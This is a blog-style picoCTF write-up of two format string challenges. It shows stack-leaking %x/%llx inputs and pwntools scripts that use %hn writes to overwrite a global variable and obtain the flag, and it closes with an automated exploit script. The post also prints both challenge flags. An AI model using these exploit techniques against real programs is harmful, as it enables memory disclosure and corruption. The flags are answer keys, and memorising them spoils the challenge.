---
layout: post
title:  "Format Strings"
description: Understanding and exploiting format string vulnerabilities
date:   2024-08-27
pinned: true
tags: ["Medium", "Format String", "Binary Exploitation"]
category: [CTF,picoCTF]
---

---
# Format String 1
## Challenge Info
description: `Patrick and Sponge Bob were really happy with those
orders you made for them, but now they're curious
about the secret menu. Find it, and along the way,
maybe you'll find something else of interest!`

Downloads the binary [here](https://artifacts.picoctf.net/c_mimas/82/format-string-1).

Downloads the source [here](https://artifacts.picoctf.net/c_mimas/82/format-string-1.c).

Connect with the challenge instance here:
`nc mimas.picoctf.net <port>`

author: Connor Chang

![format string 1](/images/formatstring-1/formatstring1.png)

## Attempts

Upon connecting to the netcat listener, we're prompted: `Give me your order and I'll read it back to you:`

Because of the name of the challenge; "**Format String** 1", we already get a pretty big hint. Just from experience, I know that `%x` can be used in format string vulnerabilities to either dump or navigate memory stacks. Naturally, this is the route I took.

```
~ > nc mimas.picoctf.net 63183                               INT 18s
Give me your order and I'll read it back to you:
%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,
Here's your order: 402118,0,6377ea00,0,a64880,a347834,b4da5590,6356fe60,637944d0,1,b4da5660,0,0,6f636970,6d316e34,33317937,3431665f,64303935,7,637968d8,7,74307250,6c797453,9,637a7de9,63578098,637944d0,0,b4da5670,252c7825,2c78252c,78252c78,252c7825,2c78252c,78252c78,252c7825,2c78252c,78252c78,252c7825,2c78252c,78252c78,252c7825,2c78252c,78252c78,252c7825,2c78252c,78252c78,252c7825,2c78252c,78252c78,252c7825,2c78252c,78252c78,252c7825,2c78252c,78252c78,252c7825,2c78252c,78252c78,252c7825,2c78252c,78252c78,454d4100,6e656c6c,4c564c48,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
Bye!
```

After pasting this into [Cyberchef](https://gchq.github.io/CyberChef/) with "From Hex" selected, I started to notice what might be a flag.

![possible flag](/images/formatstring-1/possibleflag.png)

## Solution

After inspecting the initial output, I decided to modify my format string to use `%llx` instead of `%x`. The `ll` modifier stands for "long long," which in C is a data type representing a 64-bit integer. By using `%llx`, I ensured that each stack read would capture a full 64-bit value, meaning 16 hexadecimal digits would be printed instead of just 8. This is important because the flag or other useful data might be stored in a location that requires reading all 16 bytes (instead of 8) to be fully captured.

After using this adjustment, with commas `,` to clearly separate each stack, I got a different result:


```
~ > nc mimas.picoctf.net 63183                            INT 1m 53s
Give me your order and I'll read it back to you:
%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,
Here's your order: 402118,0,7aaeacfeba00,0,1c1f880,a347834,7ffd67ec6cc0,7aaeacddce60,7aaead0014d0,1,7ffd67ec6d90,0,0,7b4654436f636970,355f31346d316e34,3478345f33317937,35365f673431665f,7d313464303935,7,7aaead0038d8,2300000007,206e693374307250,a336c797453,9,7aaead014de9,7aaeacde5098,7aaead0014d0,0,7ffd67ec6da0,6c6c252c786c6c25,252c786c6c252c78,786c6c252c786c6c,6c252c786c6c252c,2c786c6c252c786c,6c6c252c786c6c25,252c786c6c252c78,786c6c252c786c6c,6c252c786c6c252c,2c786c6c252c786c,6c6c252c786c6c25,252c786c6c252c78,786c6c252c786c6c,6c252c786c6c252c,2c786c6c252c786c,6c6c252c786c6c25,252c786c6c252c78,786c6c252c786c6c,6c252c786c6c252c,2c786c6c252c786c,6c6c252c786c6c25,252c786c6c252c78,786c6c252c786c6c,6c252c786c6c252c,2c786c6c252c786c,6c6c252c786c6c25,252c786c6c252c78,786c6c252c786c6c,6c252c786c6c252c,2c786c6c252c786c,6c6c252c786c6c25,252c786c6c252c78,786c6c252c786c6c,6c252c786c6c252c,2c786c6c252c786c,
Bye!
```

I decided to put these hex values through Cyberchef again, and saw what's definitely an encoded flag:

![possible flag](/images/formatstring-1/possibleflag2.png)

After removing the null values, I was left with this:

![jumbled flag](/images/formatstring-1/jumbledflag.png)

From here, the challenge is mostly nonsensical decoding, and it gets really bad (there is a reason it's < 50% positive reviews). I went through it anyways, but I probably won't write how I decoded/solved it, it's not really "hacking" and serves no purpose for this challenge.

flag: `picoCTF{4n1m41_57y13_4x4_f14g_65590d41}`

---

# Format String 2

## Challenge Info
This program is not impressed by cheap parlor tricks like reading arbitrary data off the stack. To impress this program you must change data on the stack!

Downloads the binary [here](https://artifacts.picoctf.net/c_rhea/26/vuln).

Downloads the source [here](https://artifacts.picoctf.net/c_rhea/26/vuln.c).

Additional details will be available after launching your challenge instance.

![format string 2](/images/formatstring-2/formatstring2.png)


author: SKRUBLAWD

## Understanding vuln.c

The code for your convenience:
```c++

#include <stdio.h>

int sus = 0x21737573;

int main() {
  char buf[1024];
  char flag[64];


  printf("You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your input: ");
  printf(buf);
  printf("\n");
  fflush(stdout);

  if (sus == 0x67616c66) {
    printf("I have NO clue how you did that, you must be a wizard. Here you go...\n");

    // Read in the flag
    FILE *fd = fopen("flag.txt", "r");
    fgets(flag, 64, fd);

    printf("%s", flag);
    fflush(stdout);
  }
  else {
    printf("sus = 0x%x\n", sus);
    printf("You can do better!\n");
    fflush(stdout);
  }

  return 0;
}
```

Below are the important parts summarized:

`int sus = 0x21737573;`
1. Global integer variable `sus` is initialized with the hex value `0x21737573`.
2. The value it's initialized with doesn't really matter, we're going to have to change it to get the flag anyways.

`if (sus == 0x67616c66), printf("I have NO clue how you did that, you must be a wizard. Here you go...\n");`
1. Checks if `sus` is equal to `0x67616c66`
2. If `sus` *is* equal to `0x67616c66`, we get the flag

So all we need to do is change the variable `sus` to equal `0x67616c66`

## Finding sus's address

Before changing the `sus` variable, we need to understand where it's being stored. To find that, I decided to use obj, but realistically any decompiler can work. The command I ran was:
```
~/Downloads > objdump -t ./vuln | grep sus
0000000000404060 g     O .data	0000000000000004              sus

~/Downloads >
```
From this, we know that the memory address where `sus` is being stored is `0x404060` (the `0x` is there because all memory addresses start with this).

From here, I recalled the challenge's hint- that pwntools would be crucial to beating this.


## Experimenting

Firstly, we can try to read stack values:

```py
from pwn import *

r = remote('rhea.picoctf.net',61512)
r.sendline(b'%1$llx,%2$llx,%3$llx,%4$llx,%5$llx,%6$llx,WEAREHERE')
r.interactive()
```
- The numbers (1, 2, 3 ,4 ,5 ,6), specify the offset on the stack
- This use the `llx` modifier is so that we print 8 bytes rather than 4

After running this python script, we receive this output:

```
> python3 solve.py
[<] Opening connection to rhea.picoctf.net on port 61512: Trying 3.13[+] Opening connection to rhea.picoctf.net on port 61512: Done
[*] Switching to interactive mode
You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
Here's your input: 402075,0,7ab445893a00,0,10962b0,7ab4458e5af0,WEAREHERE
sus = 0x21737573
You can do better!
[*] Got EOF while reading in interactive
$
```
This doesn't give us anything though. If we put each individual hex through [Cyberchef](https://gchq.github.io/CyberChef/), it just returns gibberish.

From here, we can modify the specific offsets we want to read, instead of doing `%1$llx,%2$llx,%3$llx` and so forth, we can try to do `%17$llx,%18$llx,%19$llx` etc.

Now, our script looks like this:

```py
from pwn import *

r = remote('rhea.picoctf.net',64870)
r.sendline(b'%17$llx,%18$llx,%19$llx,WEAREHERE')
r.interactive()
```
- This read and print the value at the 17th, 18th, and 19th position (offset) ont he stack using the `llx` modifier, to ensure we read all 8 bytes, rather than 4
- `WEAREHERE` serves as a marker so that we can identify where our input is on the stack.

After running this, our output looks like this:
```
> python3 solve.py
[+] Opening connection to rhea.picoctf.net on port 64870: Done
[*] Switching to interactive mode
You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
Here's your input: 5245484552414557,7e1fb8cb0045,7e1fb8cbcf78,WEAREHERE
sus = 0x21737573
You can do better!
[*] Got EOF while reading in interactive
$
```

When we put this into Cyberchef, we notice that we've successfully located where we are in the stack.
![format string 2](/images/formatstring-2/cyberchef.png)

## Writing to the stack

Now, what we can try to do is move to the address `0x404060` (the address where sus is located), and then `0x404060` (2 forward). This way we can try to write half a number at the time.

**Keep in mind**: the bytes in the memory are stored in little endian order. In little-endian systems, the least significant byte (LSB) of a multi-byte value is stored first (at the lowest memory address), and the most significant byte (MSB) is stored last (at the highest memory address). **This is why we're writing the addresses "backwards"**.

```py
from pwn import *

payloads = b'%17$llx,%18$llx,%19$llx,%20$llx,%21$llx,%22$llx,\x60\x40\x40\x00\x00\x00\x00\x00\x62\x40\x40\x00\x00\x00\x00\x00WEAREHERE'

r = remote('rhea.picoctf.net',60978)
r.sendline(payloads)
r.interactive()
```

Our output should look something like this:
```
> python3 solve.py
[+] Opening connection to rhea.picoctf.net on port 60978: Done
[*] Switching to interactive mode
You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
Here's your input: 2c786c6c24303225,2c786c6c24313225,2c786c6c24323225,404060,404062,5245484552414557,`@@
sus = 0x21737573
You can do better!
[*] Got EOF while reading in interactive
$
```
The `404060,404062` part indicates we were successful with moving to our desired part in the stack.

But remember: our goal isn't to just overwrite sus, it's to overwrite it to specifically `0x67616c66`. But because it's in little endian order, we need to write the first half, AKA the **low-order bytes**, `0x6761` and then the second half, AKA the **high-order bytes**, `6c66`. If we convert `0x6761` from hexadecimal to decimal, we get `26465`. Meaning we need to push a value of `26465` to get to `0x6761`. The script below accomplishes this.

```py
from pwn import *
r = remote('rhea.picoctf.net',57321)
s = r.recvuntil('say?')
r.sendline(b'%26464d,%20$hnx%,20$llx,%21$llx,%22$llx,\x60\x40\x40\x00\x00\x00\x00\x00\x62\x40\x40\x00\x00\x00\x00\x00WEAREHERE')
r.interactive()
```
Let's break down this script step-by-step:

`%26464d,` : This ensures our output string has 26465 characters (notice the `,` also counts as a character)

`%20$hn` : This specifier writes 2 bytes (half a word) to the memory address that's stored on the *20th* argument on the stack. This use the `%hn` modifier to ensure that we only modify the lower-order 2 bytes.

Our output:
```
sus = 0x67617573
You can do better!
[*] Got EOF while reading in interactive
$
[*] Interrupted
[*] Closed connection to rhea.picoctf.net port 57321
```
*Notice the first 4 numbers of sus has changed?*

Now we just need to write the high order bytes, `0x6c66`, which is `27750` when converted to decimal. Since we've already written `26465` for the low order bytes, we just need to write 1285 more characters:

```py
from pwn import *
r = remote('rhea.picoctf.net',55608)
s = r.recvuntil('say?')
r.sendline(b'%26464d,%20$hn%1281dAAAA%19$hnx,%22$llx,\x60\x40\x40\x00\x00\x00\x00\x00\x62\x40\x40\x00\x00\x00\x00\x00WEAREHERE')
r.interactive()
```
One final time, let's break this down:
- `1281d` - This specifies that 1281 characters should be printed
- `AAAA` - Placeholder padding (4 characters)
- `%19$hn` - Writes 2-byte value (or half-word) to the 19th stack. The `hn` modifier will write the high-order bytes.

Output:
```
I have NO clue how you did that, you must be a wizard. Here you go...
picoCTF{f0rm47_57r?_f0rm47_m3m_f43e6ccc}[*] Got EOF while reading in interactive
$
```
This have our flag!: `picoCTF{f0rm47_57r?_f0rm47_m3m_f43e6ccc}`



## Bonus: the automatic way
If you don't really care to learn how to manually execute a format string vulnerability, I've left a pwntools script below:

```py
from pwn import *

# use 'objdump -t ./vuln | grep sus' to find sus address
addr = 0x404060



host = 'rhea.picoctf.net'
port = 50181

p = remote(host, port)

# ELF object loadss binary 'vuln' which is what we're exploiting
context.binary = ELF('./vuln')

# Create a function called 'send_payloads', send a payloads to the remote service and receive all data sent back from the remote service
def send_payloads(payloads):
    p = remote(host, port)
    p.sendline(payloads)
    return p.recvall()

# Initializes a FmtStr object and analyzes the format string vulnerabilities
autofmt = FmtStr(send_payloads)

# Sets the offset
offset = autofmt.offset

payloads = fmtstr_payloads(offset, {addr: 0x67616c66})

print(f"Payloads: {payloads}")

p.sendline(payloads)

output = p.recvall()

print(output)
```
